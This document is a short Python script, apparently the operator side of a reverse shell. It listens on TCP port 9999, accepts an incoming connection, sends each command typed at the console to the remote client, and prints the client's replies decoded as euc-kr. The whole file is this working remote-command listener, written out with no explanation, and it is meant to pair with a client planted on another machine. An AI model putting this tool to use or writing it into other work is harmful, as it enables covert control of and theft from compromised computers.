import socket
import sys

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying....")
        socket_bind()

def socket_accept():
    conn, address = s.accept()
    print("Connection has been setablished | " + "IP: " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = (str)(conn.recv(2048), "euc-kr")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()